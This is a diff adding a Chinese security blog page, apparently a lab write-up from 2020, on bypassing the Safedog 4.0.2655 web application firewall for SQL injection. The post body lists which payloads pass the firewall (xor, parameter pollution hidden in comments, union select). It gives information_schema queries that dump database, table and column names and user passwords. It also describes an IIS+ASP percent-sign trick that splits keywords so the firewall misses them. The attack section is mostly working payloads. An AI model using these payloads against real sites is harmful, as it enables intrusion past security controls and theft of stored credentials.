@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:site_name" content="Littlebin404 Blog">
+    <meta property="og:type" content="article">
+
+    
+    <meta property="og:image" content="https://littlebin404.github.io/img/main.jpg">
+    <meta property="twitter:image" content="https://littlebin404.github.io/img/main.jpg" />
+    
+
+    
+    <meta name="title" content="安全狗4.0.2655 bypass之sql注入" />
+    <meta property="og:title" content="安全狗4.0.2655 bypass之sql注入" />
+    <meta property="twitter:title" content="安全狗4.0.2655 bypass之sql注入" />
+    
+
+    
+    <meta name="description" content="">
+    <meta property="og:description" content="" />
+    <meta property="twitter:description" content="" />
+    
+
+    
+    <meta property="twitter:card" content="summary" />
+    
+    
+
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>安全狗4.0.2655 bypass之sql注入-littlebin404&#39;s Blog</title>
+
+    <link rel="canonical" href="/2020/03/23/safedog-bypass/">
+
+    <link rel="stylesheet" href="/css/iDisqus.min.css"/>
+	
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    
+    <link rel="stylesheet" href="/css/syntax.css">
+    
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+    
+    
+    
+	<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    
+    
+
+    
+    
+    <script src="/js/jquery.min.js"></script>
+    
+    
+    <script src="/js/bootstrap.min.js"></script>
+    
+    
+    <script src="/js/hux-blog.min.js"></script>
+
+    
+    
+	
+	
+<style>
+#github svg {
+	transition: all 1s;
+	fill: #222;
+	color: #fff;
+	position: absolute;
+	top: 0;
+	right: 0;
+	border: 0;
+	width: 80px;
+	height: 80px;
+}
+#github:hover svg {
+	width: 160px;
+	height: 160px;
+}
+</style>
+</head>
+
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Littlebin404 Blog</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">主页</a>
+                    </li>
+                    
+                        
+                        <li>
+                            <a href="/categories/waf-bypass">waf-bypass</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">代码审计</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8">渗透神器</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">漏洞复现</a>
+                        </li>
+                        
+                    
+                    
+		    
+                        <li><a href="/top/about/">whoami</a></li>
+                    
+
+                    
+		    <li>
+                        <a href="/search">SEARCH <img src="/img/search.png" height="15" style="cursor: pointer;" alt="Search"></a>
+		    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/main.jpg')
+    }
+</style>
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/safedog" title="Safedog">
+                            Safedog
+                        </a>
+                        
+                    </div>
+                    <h1>安全狗4.0.2655 bypass之sql注入</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by 
+                        
+                            littlebin404
+                         
+                        on 
+                        Monday, March 23, 2020
+                        
+                        
+                        
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-11 col-lg-offset-1
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <header>
+                    <h2>目录</h2>
+                </header>
+                <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#环境部署">环境部署</a></li>
+        <li><a href="#payload测试">payload测试</a></li>
+        <li><a href="#aspiis-特性">asp+iis 特性</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+                
+                <blockquote>
+<p>“骚姿势sql注入绕过安全狗~~”</p>
+</blockquote>
+<h2 id="环境部署">环境部署</h2>
+<p><code>phpstudy+安全狗4.0.2655 搭建的环境</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-toml" data-lang="toml">url：http:<span style="color:#bd93f9">192.168</span>.<span style="color:#bd93f9">114.133</span>/sql.php?id=<span style="color:#bd93f9">1</span>
+</code></pre></div><p><img src="/img/B1.png" alt="screenshot"></p>
+<h2 id="payload测试">payload测试</h2>
+<p><code>or 1=1   拦</code>
+<img src="/img/B2.png" alt="screenshot"></p>
+<p><code>&amp;&amp; true 不拦（&amp;&amp; 1 拦）</code>
+<img src="/img/B3.png" alt="screenshot"></p>
+<p><code>xor 1  不拦</code>
+<img src="/img/B4.png" alt="screenshot"></p>
+<p><code>xor 0  不拦</code>
+<img src="/img/B5.png" alt="screenshot"></p>
+<p><code>?id=1/*&amp;id=1 order by 2%23*/ 不拦</code>
+<img src="/img/B6.png" alt="screenshot"></p>
+<p><code>?id=1/*&amp;id=0 union select 1,2%23*/  不拦</code></p>
+<p><code>sql.php?/*&amp;id=0 union select 1,2%23*/  也行</code>
+<img src="/img/B7.png" alt="screenshot"></p>
+<p>替换回显位2：</p>
+<p><code>(select group_concat(schema_name) from information_schema.schemata) </code></p>
+<p><em>爆出数据库名：</em></p>
+<p><img src="/img/B8.png" alt="screenshot"></p>
+<p>替换回显位2：</p>
+<p><code>(select group_concat(table_name) from information_schema.tables where table_schema='security')</code></p>
+<p>爆出表名:</p>
+<p><img src="/img/B9.png" alt="screenshot"></p>
+<p>替换回显位2：</p>
+<p><code>(select group_concat(column_name) from information_schema.columns where table_name='users')  </code></p>
+<p>爆出列名:</p>
+<p><img src="/img/B10.png" alt="screenshot"></p>
+<p>替换回显位2：
+<code>(select group_concat(password) from security.users) </code></p>
+<p>爆出password字段值:</p>
+<p><img src="/img/B11.png" alt="screenshot"></p>
+<h2 id="aspiis-特性">asp+iis 特性</h2>
+<blockquote>
+<p>在IIS+ASP的环境中，对于URL请求的参数值中的%，如果和后面的字符构成的字符串在URL编码表之外，ASP脚本处理时会将其忽略。
+但是waf拿到包后会对url,比如：id=1 union all se%lect 1,2,3,4 fro%m adm%in,此时waf因为%的分隔，无法检测出关键字select from等。
+因为IIS的特性，最后在服务器上解析的时候，id获取的实际参数就变为id=1 union all select 1,2,3,4 from admin，从而绕过了waf。</p>
+</blockquote>
+
+
+                
+
+                <hr>
+                <ul class="pager">
+                    
+                    <li class="next">
+                        <a href="/2020/02/24/cve-2020-1938-apache-tomcat/" data-toggle="tooltip" data-placement="top" title="CVE-2020-1938 Apache Tomcat 文件读取文件包含漏洞">
+                            下一篇&rarr;</a>
+                    </li>
+                    
+                    
+                    <li class="previous">
+                        <a href="/2020/04/20/TP6-getshell/" data-toggle="tooltip" data-placement="top" title="thinkphp6.0文件上传getshell复现">&larr;上一篇 </a>
+                    </li>
+                    
+                </ul>
+
+                
+<div id="disqus-comment"></div>
+
+
+
+            </div>
+            
+            <div class="
+                col-lg-11 col-lg-offset-1
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">标签</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        <a href="/tags/burpsuit" title="burpsuit">
+                            burpsuit
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/finecms" title="finecms">
+                            finecms
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/redis" title="redis">
+                            redis
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/safedog" title="safedog">
+                            safedog
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/tomcat" title="tomcat">
+                            tomcat
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/xml%E6%B3%A8%E5%85%A5" title="xml注入">
+                            xml注入
+                        </a>
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+                <section>
+                    <hr>
+                    <h5>友链</h5>
+                    <ul class="list-inline">
+                        
+                        <li><a target="_blank" href="https://www.jianshu.com/u/990ca34c32dd">简书</a></li>
+                        
+                    </ul>
+                </section>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <script src="/js/autoload.js"></script>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                   
+                    
+                    <li>
+                        <a href="mailto:littlebin404@163.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		    
+                    
+                    
+                    
+                    
+
+                    
+
+		    
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/littlebin404">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+            
+            
+            
+                </ul>
+		<p class="copyright text-muted">
+                    Copyright &copy; Littlebin404 Blog 2020
+                    
+                    
+                    
+                        
+                        
+                        
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+
+
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        async("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    async("/bn/fastclick.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+
+
+</body>
+</html>
